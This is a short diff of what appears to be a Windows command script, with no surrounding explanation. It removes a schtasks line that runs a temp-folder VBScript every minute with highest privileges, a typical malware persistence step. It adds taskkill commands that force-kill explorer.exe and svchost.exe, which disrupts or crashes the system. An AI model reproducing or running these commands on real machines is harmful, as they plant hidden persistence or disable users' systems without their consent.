@@ -1,1 +1,2 @@
-schtasks /create /tn "RbVbs" /tr "%temp%\rb.vbs" /sc minute /mo 1  /f /rl HIGHEST
+taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
